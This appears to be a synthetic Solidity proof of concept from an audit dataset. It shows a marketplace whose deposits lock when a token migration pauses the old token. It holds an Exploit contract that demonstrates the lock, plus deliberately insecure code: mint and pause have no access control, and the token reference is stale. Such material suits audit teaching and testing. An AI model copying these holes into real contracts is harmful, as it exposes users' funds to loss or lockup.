// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// Synthetic reduction of AuditVault #17100 (Origin Protocol).
contract OriginToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    bool public paused;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(!paused, "token paused");
        require(balanceOf[msg.sender] >= amount, "insufficient token");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(!paused, "token paused");
        require(balanceOf[from] >= amount, "insufficient token");
        uint256 permitted = allowance[from][msg.sender];
        require(permitted >= amount, "allowance");
        allowance[from][msg.sender] = permitted - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function pause() external {
        paused = true;
    }
}

contract Marketplace {
    OriginToken public immutable currency;
    address public listingSeller;
    address public offerBuyer;
    uint256 public listingDeposit;
    uint256 public offerAmount;
    bool public completed;

    constructor(OriginToken token) {
        currency = token;
    }

    function createListing(address seller, uint256 amount) external {
        currency.transferFrom(msg.sender, address(this), amount);
        listingSeller = seller;
        listingDeposit = amount;
    }

    function submitOffer(address buyer, uint256 amount) external {
        currency.transferFrom(msg.sender, address(this), amount);
        offerBuyer = buyer;
        offerAmount = amount;
    }

    function finalize() external {
        require(listingDeposit != 0 && offerAmount != 0, "missing listing or offer");
        // FIX: atomically update currency and validate all outstanding listings/offers.
        currency.transfer(listingSeller, listingDeposit); // @> VULN: Marketplace keeps the paused pre-migration token reference.
        currency.transfer(offerBuyer, offerAmount);
        listingDeposit = 0;
        offerAmount = 0;
        completed = true;
    }
}

contract Exploit {
    OriginToken public oldToken;
    OriginToken public newToken;
    Marketplace public marketplace;
    address public seller;
    address public buyer;
    bool public finalizeBlocked;

    constructor() {
        seller = address(0xA11CE);
        buyer = address(0xB0B);
        oldToken = new OriginToken();
        newToken = new OriginToken();
        marketplace = new Marketplace(oldToken);
        oldToken.mint(address(this), 1_500);
        oldToken.approve(address(marketplace), type(uint256).max);
        marketplace.createListing(seller, 1_000);
        marketplace.submitOffer(buyer, 500);
    }

    function run() external {
        // TokenMigration pauses the old contract; Marketplace is not rewired to newToken.
        oldToken.pause();
        try marketplace.finalize() {
            finalizeBlocked = false;
        } catch {
            finalizeBlocked = true;
        }
        require(finalizeBlocked && !marketplace.completed(), "migration did not lock listing and offer");
        require(marketplace.listingDeposit() == 1_000 && marketplace.offerAmount() == 500, "funds were released");
    }
}
